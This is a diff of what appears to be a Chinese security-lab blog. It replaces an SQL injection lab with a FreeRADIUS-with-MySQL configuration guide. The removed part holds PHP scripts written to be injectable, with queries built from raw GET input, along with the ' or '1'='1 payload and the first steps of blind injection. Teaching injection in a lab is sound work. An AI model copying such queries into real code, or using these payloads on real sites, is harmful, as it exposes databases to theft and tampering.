+<p><img src="/网络安全实验/网络对抗原理实验二/j.png" alt="coin"></p>
+<p>默认情况下、使用apt-get命令来安装freeradius会自动检测到已经安装了mysql而自动把database设置为mysql、如果迩的不是这样显示请设置成mysql、然后再再看password这个参数、如果你之前已经更改了radius用户的密码、这里要做相应的修改、其余的参数就默认好了</p>
 <ul>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，展示查询结果是否为空。如输入学号，展示是否有该学生存在。</li>
+<li>修改了sql.conf、再设置相应的设备通知其使用mysql作为数据存储设备</li>
 </ul>
-<p>html文件如下所示</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>GET sql injection<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./2.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">                        student id:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/c.png" alt="coin"></p>
-<p>php文件如下所示</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">        $con=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'&#123;********&#125;'</span>);</span><br><span class="line">        <span class="keyword">if</span>($con)&#123;</span><br><span class="line">                mysqli_select_db($con, <span class="string">'test'</span>);</span><br><span class="line">                $query=mysqli_query($con, <span class="string">"SELECT name FROM student WHERE id='$id';"</span>);</span><br><span class="line">                $num=mysqli_num_rows($query);</span><br><span class="line">                $i=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>($i&lt;$num)&#123;</span><br><span class="line">                        $result=mysqli_fetch_assoc($query);</span><br><span class="line">                        <span class="comment">//echo "username:".$result["username"]."&lt;br/&gt;";</span></span><br><span class="line">                        $i++;</span><br><span class="line">                &#125;</span><br><span class="line">    <span class="keyword">if</span>($i==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"yes"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"no"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/d.png" alt="coin"></p>
+<p><img src="/网络安全实验/网络对抗原理实验二/k.png" alt="coin"></p>
+<p>把authorize{}字段下的file注释掉、反注释sql、这里的file指的就是usrs文件、将不再把用户信息写在users而使用mysql来存储用户信息 把accounting{} 字段下的sql反注释、启用sql来记录统计信息 把session{}字段下的sql反注释、启用用户同时登录限制功能、这里还需要修改其它地方、一会再说 把post-auth{} 字段的sql反注释、启用用户登录后进行数据记录功能</p>
 <ul>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，将查询结果是否为空展示在两段随机内容之间。</li>
+<li>接下来开启启用用户同时登录限制功能</li>
 </ul>
-<p>html文件代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>GET sql injection<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./3.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">                        student id:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/e.png" alt="coin"></p>
-<p>php文件代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_rand</span><span class="params">($length = <span class="number">5</span>, $char = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_int($length) || $length &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $string = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = $length; $i &gt; <span class="number">0</span>; $i--) &#123;</span><br><span class="line">        $string .= $char[mt_rand(<span class="number">0</span>, strlen($char) - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">        $con=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'[********]'</span>);</span><br><span class="line">        <span class="keyword">if</span>($con)&#123;</span><br><span class="line">                mysqli_select_db($con, <span class="string">'test'</span>);</span><br><span class="line">                $query=mysqli_query($con, <span class="string">"SELECT name FROM student WHERE id='$id';"</span>);</span><br><span class="line">                $num=mysqli_num_rows($query);</span><br><span class="line">                $i=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>($i&lt;$num)&#123;</span><br><span class="line">                        $result=mysqli_fetch_assoc($query);</span><br><span class="line">                        <span class="comment">//echo "username:".$result["username"]."&lt;br/&gt;";</span></span><br><span class="line">                        $i++;</span><br><span class="line">                &#125;</span><br><span class="line">    <span class="keyword">if</span>($i==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> str_rand() . <span class="string">"yes"</span> . str_rand();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> str_rand() . <span class="string">"no"</span> . str_rand();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/f.png" alt="coin"></p>
+<p><img src="/网络安全实验/网络对抗原理实验二/l.png" alt="coin"></p>
+<blockquote>
+<p>将这几行反注释</p>
+</blockquote>
+<p><img src="/网络安全实验/网络对抗原理实验二/m.png" alt="coin"></p>
+<p>这样整个对mysql的radius配置就已经完成了</p>
 <ul>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，展示查询结果的条件表达式结果，并将结果展示在两段随机内容之间。如入学号，展示该学生分数是否大于 60。</li>
+<li>测试是否连接成功,在radius数据库建立几条用户信息以测试mysql+freeradius的用户认证是否成功，添上这几句</li>
 </ul>
-<p>html文件源码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>GET sql injection<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./4.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">                        student id:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/g.png" alt="coin"></p>
-<p>php文件源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_rand</span><span class="params">($length = <span class="number">5</span>, $char = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_int($length) || $length &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $string = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = $length; $i &gt; <span class="number">0</span>; $i--) &#123;</span><br><span class="line">        $string .= $char[mt_rand(<span class="number">0</span>, strlen($char) - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">        $con=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'[********]'</span>);</span><br><span class="line">        <span class="keyword">if</span>($con)&#123;</span><br><span class="line">                mysqli_select_db($con, <span class="string">'test'</span>);</span><br><span class="line">                $query=mysqli_query($con, <span class="string">"SELECT name FROM student WHERE id='$id' AND score&gt;60;"</span>);</span><br><span class="line">                $num=mysqli_num_rows($query);</span><br><span class="line">                $i=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>($i&lt;$num)&#123;</span><br><span class="line">                        $result=mysqli_fetch_assoc($query);</span><br><span class="line">                        <span class="comment">//echo "username:".$result["username"]."&lt;br/&gt;";</span></span><br><span class="line">                        $i++;</span><br><span class="line">                &#125;</span><br><span class="line">    <span class="keyword">if</span>($i==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> str_rand() . <span class="string">"yes"</span> . str_rand();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#我们这里把没有查到的以及低于60分的都归为no</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> str_rand() . <span class="string">"no"</span> . str_rand();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/h.png" alt="coin"></p>
-<ul>
-<li>根据输入的参数值，拼接 SQL 查询语句并执行，但展示一个固定的结果。例如如输入学号，查询是否有学生存在，然后输出固定内容。</li>
+<p><img src="/网络安全实验/网络对抗原理实验二/n.png" alt="coin"></p>
+<blockquote>
+<p>结果为</p>
+</blockquote>
+<p><img src="/网络安全实验/网络对抗原理实验二/o.png" alt="coin"></p>
+<p>这就解释了一开始用radtest santu [<strong>**</strong>] localhost 1812 testing123命令会出现如下的应答</p>
+<p><img src="/网络安全实验/网络对抗原理实验二/p.png" alt="coin"></p>
+<p>注意：这些数据类型的属性值attribute都是特定的字符、不是随随便便自己写上去的、要查看定义这些属性的文件请查看迩当前配置文件的dictionary目录、其实里面也啥内容没定义到、只是写上了路径、一般会写上包含在</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$INCLUDE /usr/share/freeradius/dictionary</span><br></pre></td></tr></table></figure>
+<p>这里的意思就是整个dictionary文件被放置在这个文件中、其实这个文件也是个路径信息、所以真正定义的dictionary文件是放在/usr/share/freeradius/这个目录、比如Framed-IP-Address属性被定义在dictionary.rfc2865文件中、Cleartext-Password被定义在dictionary.freeradius.internal文件中</p>
+<p><strong>注意点</strong>：注意之前的freeradius服务必须先停掉、不然会出现冲突、然后再使用以上用户来测试</p>
+<p><img src="/网络安全实验/网络对抗原理实验二/q.png" alt="coin"></p>
+<p>返回Access-Accept状态的同时会返回相应reply表格的内容、先返回radreply的用户返回信息、再返回radgroupreply的所属组返回信息、返回成功就表示配置已经正确了。</p>
+<h2 id="配置freeradius-ldap"><a href="#配置freeradius-ldap" class="headerlink" title="配置freeradius-ldap"></a>配置freeradius-ldap</h2><ul>
+<li>配置/etc/freeradius/modules/ldap</li>
 </ul>
-<p>html文件源码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>GET sql injection<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./5.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">                        student id:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/i.png" alt="coin"></p>
-<p>php文件源代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">        $con=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'[********]'</span>);</span><br><span class="line">        <span class="keyword">if</span>($con)&#123;</span><br><span class="line">                mysqli_select_db($con, <span class="string">'test'</span>);</span><br><span class="line">                $query=mysqli_query($con, <span class="string">"SELECT name FROM student WHERE id='$id';"</span>);</span><br><span class="line">                $num=mysqli_num_rows($query);</span><br><span class="line">                $i=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>($i&lt;$num)&#123;</span><br><span class="line">                        $result=mysqli_fetch_assoc($query);</span><br><span class="line">                        <span class="comment">//echo "username:".$result["username"]."&lt;br/&gt;";</span></span><br><span class="line">                        $i++;</span><br><span class="line">                &#125;</span><br><span class="line">    <span class="keyword">if</span>($i==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"pass"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"pass"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/j.png" alt="coin"></p>
-<ul>
-<li>据输入的参数值，拼接 SQL 语句并执行，更新数据库。如输入学号和分数，将对应学生的分数更新。</li>
-</ul>
-<p>html文件源码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>database update test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./6.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">                        student id:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        student score:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"score"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"update"</span> <span class="attr">name</span>=<span class="string">"update"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/k.png" alt="coin"></p>
-<p>php文件源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">        $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">        $score=$_GET[<span class="string">'score'</span>];</span><br><span class="line">        $con=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'[********]'</span>);</span><br><span class="line">        <span class="keyword">if</span>($con)&#123;</span><br><span class="line">                mysqli_select_db($con,<span class="string">'test'</span>);</span><br><span class="line">                $query=mysqli_query($con, <span class="string">"UPDATE student SET score='$score' WHERE id='$id';"</span>);</span><br><span class="line">                <span class="comment">#更新后的结果输出</span></span><br><span class="line">                $query=mysqli_query($con, <span class="string">"SELECT name,score FROM student WHERE id='$id';"</span>);</span><br><span class="line">                $num=mysqli_num_rows($query);</span><br><span class="line">                $i=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>($i&lt;$num)&#123;</span><br><span class="line">                        $result=mysqli_fetch_assoc($query);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"更新后的结果输出"</span>.<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"name:"</span>.$result[<span class="string">"name"</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"score:"</span>.$result[<span class="string">"score"</span>].<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">                        $i++;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="/网络安全实验/网络对抗原理实验一/l.png" alt="coin"></p>
-<p>###手工注入实验</p>
-<ul>
-<li>对于第一种漏洞场景，我们可以使用万能密码<code>&#39; or &#39;1&#39; = &#39;1</code>的方法，将作为参数id通过GET的传参方式拼接到sql语句中。使得数据库查询语句变为</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>,score <span class="keyword">from</span> student <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="string">'1'</span> =<span class="string">'1'</span>;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>正常访问场景</p>
-</blockquote>
-<p><img src="/网络安全实验/网络对抗原理实验一/a1.png" alt="coin"></p>
-<p><img src="/网络安全实验/网络对抗原理实验一/a2.png" alt="coin"></p>
-<blockquote>
-<p>上述万能密码注入结果可将整个test表输出</p>
-</blockquote>
-<p><img src="/网络安全实验/网络对抗原理实验一/a3.png" alt="coin"></p>
-<p><img src="/网络安全实验/网络对抗原理实验一/a4.png" alt="coin"></p>
-<ul>
-<li><p>这个这种情况属于True or False类型的漏洞，只会返回布尔值而不会返回查询结果，所以我们首先需要猜测数据库名字的长度，接着一个字母一个字母的猜测，根据服务器返回的确认信息，最终确认每个字母。</p>
-<ol>
-<li><p>先判断是否有注入点</p>
-<ul>
-<li><p>是否有整型注入点<br><img src="/网络安全实验/网络对抗原理实验一/b3.png" alt="coin"></p>
-</li>
-<li><p>是否有字符型注入点<br><img src="/网络安全实验/网络对抗原理实验一/b4.png" alt="coin"></p>
-<blockquote>
